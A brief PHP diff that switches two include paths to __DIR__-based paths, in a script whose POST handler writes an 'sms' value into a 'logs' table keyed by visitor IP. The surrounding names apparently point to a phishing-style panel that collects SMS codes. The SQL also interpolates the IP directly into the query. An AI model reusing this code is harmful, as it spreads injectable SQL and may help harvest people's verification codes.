@@ -1,7 +1,7 @@
 <?php
 
-include_once("../.././config.php");
-include_once("../.././txmd/Data/Server/GrabIP.php");
+include_once(__DIR__ . "/../../config.php");
+include_once(__DIR__ . "/../../txmd/Data/Server/GrabIP.php");
 
 if($_POST) {
     $sorgu = $pdo->prepare("UPDATE logs SET sms=? WHERE ip = '{$ip}'");
